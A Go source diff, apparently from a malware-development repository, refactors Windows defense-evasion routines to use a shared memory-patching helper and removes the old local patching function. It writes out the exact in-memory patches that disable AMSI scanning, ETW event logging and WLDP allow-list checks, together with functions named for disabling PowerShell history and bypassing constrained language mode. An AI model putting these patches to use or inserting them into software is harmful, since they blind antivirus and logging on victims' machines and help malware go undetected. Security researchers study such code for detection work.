@@ -6,6 +6,8 @@ import (
 	"fmt"
 
 	"golang.org/x/sys/windows"
+
+	"github.com/oioio-space/maldev/win/api"
 )
 
 // WindowsVersion contains Windows version information.
@@ -97,7 +99,7 @@ func patchAMSI() error {
 
 	// mov eax, 0x80070057; ret
 	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
-	return patchFunction(amsiScanBuffer.Addr(), patch)
+	return api.PatchMemory(amsiScanBuffer.Addr(), patch)
 }
 
 // patchETW patches EtwEventWrite to return success immediately.
@@ -115,7 +117,7 @@ func patchETW() error {
 
 	// xor eax, eax; ret
 	patch := []byte{0x33, 0xC0, 0xC3}
-	return patchFunction(etwEventWrite.Addr(), patch)
+	return api.PatchMemory(etwEventWrite.Addr(), patch)
 }
 
 // patchWLDP patches WldpIsClassInApprovedList to always return true.
@@ -133,7 +135,7 @@ func patchWLDP() error {
 
 	// mov eax, 1; ret
 	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}
-	return patchFunction(wldpIsClassInApprovedList.Addr(), patch)
+	return api.PatchMemory(wldpIsClassInApprovedList.Addr(), patch)
 }
 
 // disablePSHistory disables PowerShell command history via environment variables.
@@ -166,50 +168,6 @@ func bypassCLM() error {
 	)
 	if err != nil {
 		return fmt.Errorf("SetEnvironmentVariable: %w", err)
-	}
-
-	return nil
-}
-
-// patchFunction writes a byte patch to a function address in memory.
-func patchFunction(addr uintptr, patch []byte) error {
-	var oldProtect uint32
-
-	err := windows.VirtualProtect(
-		addr,
-		uintptr(len(patch)),
-		windows.PAGE_EXECUTE_READWRITE,
-		&oldProtect,
-	)
-	if err != nil {
-		return fmt.Errorf("VirtualProtect: %w", err)
-	}
-
-	defer func() {
-		var dummy uint32
-		windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &dummy)
-	}()
-
-	currentProcess, err := windows.GetCurrentProcess()
-	if err != nil {
-		return fmt.Errorf("GetCurrentProcess: %w", err)
-	}
-
-	var bytesWritten uintptr
-
-	err = windows.WriteProcessMemory(
-		currentProcess,
-		addr,
-		&patch[0],
-		uintptr(len(patch)),
-		&bytesWritten,
-	)
-	if err != nil {
-		return fmt.Errorf("WriteProcessMemory: %w", err)
-	}
-
-	if bytesWritten != uintptr(len(patch)) {
-		return fmt.Errorf("incomplete write: %d/%d bytes", bytesWritten, len(patch))
 	}
 
 	return nil
